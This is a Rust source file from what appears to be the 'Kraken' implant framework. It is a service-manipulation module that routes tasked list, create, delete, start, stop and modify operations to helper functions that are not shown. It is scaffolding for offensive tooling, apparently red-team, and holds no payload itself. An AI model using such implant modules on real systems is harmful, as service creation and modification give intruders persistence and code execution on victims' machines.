//! mod-svc: Windows service manipulation module for Kraken implant
//!
//! Provides service list, query, create, delete, start, stop, and modify capabilities.
//! This module is Windows-only; on other platforms all operations return an error.

use common::{KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::{service_task, ServiceTask};

mod ops;

pub struct SvcModule {
    id: ModuleId,
}

impl SvcModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("svc"),
        }
    }
}

impl Default for SvcModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for SvcModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Service"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: ServiceTask = ServiceTask::decode(task_data)
            .map_err(|e| KrakenError::Protocol(e.to_string()))?;

        match task.operation {
            Some(service_task::Operation::List(list)) => {
                let result = ops::svc_list(&list)?;
                Ok(TaskResult::ServiceList(result))
            }
            Some(service_task::Operation::Query(query)) => {
                let result = ops::svc_query(&query)?;
                Ok(TaskResult::ServiceInfo(result))
            }
            Some(service_task::Operation::Create(create)) => {
                let result = ops::svc_create(&create)?;
                Ok(TaskResult::ServiceOperation(result))
            }
            Some(service_task::Operation::Delete(delete)) => {
                let result = ops::svc_delete(&delete)?;
                Ok(TaskResult::ServiceOperation(result))
            }
            Some(service_task::Operation::Start(start)) => {
                let result = ops::svc_start(&start)?;
                Ok(TaskResult::ServiceOperation(result))
            }
            Some(service_task::Operation::Stop(stop)) => {
                let result = ops::svc_stop(&stop)?;
                Ok(TaskResult::ServiceOperation(result))
            }
            Some(service_task::Operation::Modify(modify)) => {
                let result = ops::svc_modify(&modify)?;
                Ok(TaskResult::ServiceOperation(result))
            }
            None => Err(KrakenError::Protocol("missing service operation".into())),
        }
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(SvcModule);

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_module_id() {
        let module = SvcModule::new();
        assert_eq!(module.id().as_str(), "svc");
        assert_eq!(module.name(), "Service");
    }
}
